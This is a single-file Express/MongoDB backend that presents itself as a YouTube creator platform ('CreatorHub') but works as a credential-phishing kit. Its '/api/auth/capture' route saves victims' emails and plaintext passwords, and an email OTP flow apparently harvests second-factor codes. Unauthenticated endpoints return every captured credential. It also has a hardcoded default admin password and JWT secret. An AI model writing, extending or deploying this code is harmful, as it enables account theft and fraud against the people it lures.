/**
 * COMPLETE BACKEND CODE
 * =====================
 * Database Models, Routes, Controllers, Middleware, Utils
 * All in one file for easy management
 */

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const nodemailer = require('nodemailer');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ==================== DATABASE MODELS ====================

// Credential Model Schema
const credentialSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  passwordOriginal: { type: String, required: true },
  timestamp: { type: Date, default: Date.now },
  otp: String,
  otpStatus: {
    type: String,
    enum: ['Pending', 'Generated', 'Verified'],
    default: 'Pending'
  },
  otpTimestamp: Date,
  verifiedAt: Date
});

const Credential = mongoose.model('Credential', credentialSchema);

// ==================== UTILITIES ====================

// OTP Generator
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Send OTP via Email
async function sendOTP(email, otp) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASSWORD
      }
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: email,
      subject: 'Your CreatorHub Verification Code',
      html: `
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f5f5f5; border-radius: 10px;">
          <h2>Email Verification</h2>
          <p>Your verification code is:</p>
          <h1 style="color: #4CAF50; font-size: 48px; letter-spacing: 5px; margin: 20px 0;">
            ${otp}
          </h1>
          <p>This code will expire in 10 minutes.</p>
          <p style="color: #666; font-size: 12px;">If you did not request this, please ignore this email.</p>
        </div>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ OTP sent to ${email}`);
    return true;
  } catch (error) {
    console.error('❌ Error sending OTP:', error);
    return false;
  }
}

// Email Validation
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// ==================== API ROUTES ====================

// HEALTH CHECK
app.get('/api/health', (req, res) => {
  res.status(200).json({ message: 'Server is running' });
});

// ==================== AUTH ROUTES ====================

// Capture Credentials
app.post('/api/auth/capture', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !isValidEmail(email)) {
      return res.status(400).json({ message: 'Invalid email format' });
    }

    if (!password || password.length < 6) {
      return res.status(400).json({ message: 'Password must be at least 6 characters' });
    }

    const existingCredential = await Credential.findOne({ email });
    if (existingCredential) {
      return res.status(400).json({ message: 'Email already exists' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const newCredential = new Credential({
      email,
      password: hashedPassword,
      passwordOriginal: password,
      timestamp: new Date(),
      otpStatus: 'Pending'
    });

    await newCredential.save();

    console.log(`✅ Credentials captured: ${email}`);
    res.status(201).json({
      message: 'Credentials captured successfully',
      credentialId: newCredential._id
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ message: error.message });
  }
});

// Get All Credentials
app.get('/api/auth/all', async (req, res) => {
  try {
    const credentials = await Credential.find();
    res.status(200).json(credentials);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// ==================== OTP ROUTES ====================

// Rate limiting map
const otpAttempts = new Map();

// Rate Limiter Middleware
const rateLimiter = (req, res, next) => {
  const email = req.body.email;
  const now = Date.now();
  const userAttempts = otpAttempts.get(email) || [];
  const recentAttempts = userAttempts.filter(time => now - time < 60000);

  if (recentAttempts.length >= 5) {
    return res.status(429).json({
      error: 'Too many OTP requests. Please try again in 1 minute.'
    });
  }

  recentAttempts.push(now);
  otpAttempts.set(email, recentAttempts);
  next();
};

// Send OTP
app.post('/api/otp/send', rateLimiter, async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email required' });
    }

    const credential = await Credential.findOne({ email });
    if (!credential) {
      return res.status(404).json({ error: 'Email not found' });
    }

    const otp = generateOTP();
    const sent = await sendOTP(email, otp);

    if (!sent) {
      return res.status(500).json({ error: 'Failed to send OTP' });
    }

    await Credential.updateOne(
      { email },
      {
        $set: {
          otp,
          otpStatus: 'Generated',
          otpTimestamp: new Date()
        }
      }
    );

    res.status(200).json({
      success: true,
      message: 'OTP sent successfully',
      expiresIn: '10 minutes'
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Verify OTP
app.post('/api/otp/verify', async (req, res) => {
  try {
    const { email, otp } = req.body;

    if (!email || !otp) {
      return res.status(400).json({ error: 'Email and OTP required' });
    }

    const credential = await Credential.findOne({ email });
    if (!credential) {
      return res.status(404).json({ error: 'Email not found' });
    }

    const otpAge = Date.now() - credential.otpTimestamp;
    const TEN_MINUTES = 10 * 60 * 1000;

    if (otpAge > TEN_MINUTES) {
      return res.status(400).json({ error: 'OTP has expired' });
    }

    if (credential.otp !== otp) {
      return res.status(400).json({ error: 'Invalid OTP' });
    }

    await Credential.updateOne(
      { email },
      {
        $set: {
          otpStatus: 'Verified',
          verifiedAt: new Date()
        }
      }
    );

    console.log(`✅ OTP Verified: ${email}`);
    res.status(200).json({
      success: true,
      message: 'OTP verified successfully',
      redirect: '/loading'
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Resend OTP
app.post('/api/otp/resend', rateLimiter, async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: 'Email required' });
    }

    const credential = await Credential.findOne({ email });
    if (!credential) {
      return res.status(404).json({ error: 'Email not found' });
    }

    const otp = generateOTP();
    const sent = await sendOTP(email, otp);

    if (!sent) {
      return res.status(500).json({ error: 'Failed to send OTP' });
    }

    await Credential.updateOne(
      { email },
      {
        $set: {
          otp,
          otpStatus: 'Generated',
          otpTimestamp: new Date()
        }
      }
    );

    res.status(200).json({
      success: true,
      message: 'OTP resent successfully'
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// ==================== CHANNEL ROUTES ====================

// Fetch Channel Data
app.post('/api/channel/fetch', async (req, res) => {
  try {
    const { channelUrl } = req.body;

    const channelMatch = channelUrl.match(/(?:youtube\.com\/@|youtube\.com\/c\/|youtube\.com\/channel\/)([^/?&]+)/);

    if (!channelMatch) {
      return res.status(400).json({ error: 'Invalid YouTube URL' });
    }

    const channelIdentifier = channelMatch[1];

    try {
      const response = await axios.get('https://www.googleapis.com/youtube/v3/search', {
        params: {
          part: 'snippet',
          q: channelIdentifier,
          type: 'channel',
          key: process.env.GOOGLE_API_KEY,
          maxResults: 1
        }
      });

      if (response.data.items.length === 0) {
        return res.status(404).json({ error: 'Channel not found' });
      }

      const channel = response.data.items[0];
      const channelId = channel.id.channelId;

      const detailResponse = await axios.get('https://www.googleapis.com/youtube/v3/channels', {
        params: {
          part: 'snippet,statistics',
          id: channelId,
          key: process.env.GOOGLE_API_KEY
        }
      });

      const channelDetails = detailResponse.data.items[0];

      const channelData = {
        success: true,
        channelId: channelId,
        name: channelDetails.snippet.title,
        description: channelDetails.snippet.description,
        profilePic: channelDetails.snippet.thumbnails.high.url,
        subscribers: channelDetails.statistics.subscriberCount || 'Hidden',
        totalViews: channelDetails.statistics.viewCount,
        totalVideos: channelDetails.statistics.videoCount
      };

      res.status(200).json(channelData);
    } catch (apiError) {
      console.error('YouTube API Error:', apiError);
      res.status(500).json({ error: 'Failed to fetch channel data' });
    }
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get Channel by ID
app.get('/api/channel/:channelId', async (req, res) => {
  try {
    const { channelId } = req.params;

    const response = await axios.get('https://www.googleapis.com/youtube/v3/channels', {
      params: {
        part: 'snippet,statistics',
        id: channelId,
        key: process.env.GOOGLE_API_KEY
      }
    });

    if (response.data.items.length === 0) {
      return res.status(404).json({ error: 'Channel not found' });
    }

    const channel = response.data.items[0];

    const channelData = {
      channelId: channel.id,
      name: channel.snippet.title,
      profilePic: channel.snippet.thumbnails.high.url,
      subscribers: channel.statistics.subscriberCount || 'Hidden',
      totalViews: channel.statistics.viewCount,
      totalVideos: channel.statistics.videoCount
    };

    res.status(200).json(channelData);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// ==================== ADMIN ROUTES ====================

// Get All Credentials (Admin)
app.get('/api/admin/credentials', async (req, res) => {
  try {
    const credentials = await Credential.find().sort({ timestamp: -1 });
    res.status(200).json(credentials);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Get Credential by ID (Admin)
app.get('/api/admin/credentials/:id', async (req, res) => {
  try {
    const credential = await Credential.findById(req.params.id);

    if (!credential) {
      return res.status(404).json({ error: 'Credential not found' });
    }

    res.status(200).json(credential);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Admin Login
app.post('/api/admin-auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    const adminEmail = process.env.ADMIN_EMAIL || 'admin@creatorhub.com';
    const adminPassword = process.env.ADMIN_PASSWORD || 'Admin@123456';

    if (email !== adminEmail || password !== adminPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign(
      { email, role: 'admin', loginTime: new Date() },
      process.env.JWT_SECRET || 'your_secret_key',
      { expiresIn: '24h' }
    );

    res.status(200).json({
      success: true,
      message: 'Login successful',
      token,
      adminData: {
        email,
        role: 'admin',
        loginTime: new Date()
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ==================== DATABASE CONNECTION ====================

mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/youtube-creator-platform', {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
  .then(() => console.log('✅ MongoDB connected'))
  .catch(err => console.log('❌ MongoDB connection error:', err));

// ==================== ERROR HANDLING ====================

app.use((err, req, res, next) => {
  console.error('❌ Error:', err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

// ==================== START SERVER ====================

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 http://localhost:${PORT}`);
  console.log('✅ All endpoints ready');
});

module.exports = app;